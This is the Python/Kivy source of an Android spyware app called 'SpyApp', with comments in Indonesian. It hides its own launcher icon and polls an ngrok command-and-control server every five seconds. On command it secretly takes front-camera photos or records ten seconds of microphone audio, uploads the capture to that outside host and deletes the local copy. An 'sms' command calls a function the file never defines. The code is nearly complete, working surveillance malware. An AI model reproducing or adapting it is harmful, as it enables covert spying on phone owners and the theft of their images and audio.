import os, time, requests
from kivy.app import App
from kivy.clock import Clock
from jnius import autoclass

# Menggunakan link statis dari Dashboard Ngrok Anda
URL_NGROK = "https://bleariest-portraitlike-dreama.ngrok-free.dev"

class SpyApp(App):
    def build(self):
        self.hide_icon() # Sembunyikan ikon segera setelah dibuka
        Clock.schedule_interval(self.check_server, 5) # Cek perintah setiap 5 detik
        return None

    def hide_icon(self):
        try:
            PA = autoclass('org.kivy.android.PythonActivity').mActivity
            PM = autoclass('android.content.pm.PackageManager')
            CN = autoclass('android.content.ComponentName')
            # Nama paket harus sesuai dengan buildozer.spec
            comp = CN("org.test.cameraspy", "org.kivy.android.PythonActivity")
            PA.getPackageManager().setComponentEnabledSetting(comp, PM.COMPONENT_ENABLED_STATE_DISABLED, PM.DONT_KILL_APP)
        except: pass

    def check_server(self, dt):
        try:
            r = requests.get(f"{URL_NGROK}/get-command", timeout=5)
            cmd = r.json().get("action")
            if cmd == "photo": self.take_photo()
            elif cmd == "mic": self.record_mic()
            elif cmd == "sms": self.get_sms()
        except: pass

    def take_photo(self):
        import cv2
        cap = cv2.VideoCapture(1) # Kamera depan
        ret, frame = cap.read()
        if ret:
            cv2.imwrite("snap.jpg", frame)
            self.upload_file("snap.jpg")
        cap.release()

    def record_mic(self):
        MR = autoclass('android.media.MediaRecorder')
        rec = MR()
        rec.setAudioSource(1)
        rec.setOutputFormat(3)
        rec.setOutputFile("/sdcard/audio.3gp")
        rec.setAudioEncoder(1)
        rec.prepare()
        rec.start()
        time.sleep(10) # Rekam selama 10 detik
        rec.stop()
        self.upload_file("/sdcard/audio.3gp")

    def upload_file(self, path):
        with open(path, 'rb') as f:
            requests.post(f"{URL_NGROK}/upload", files={'file': f})
        if os.path.exists(path): os.remove(path)

if __name__ == '__main__':
    SpyApp().run()
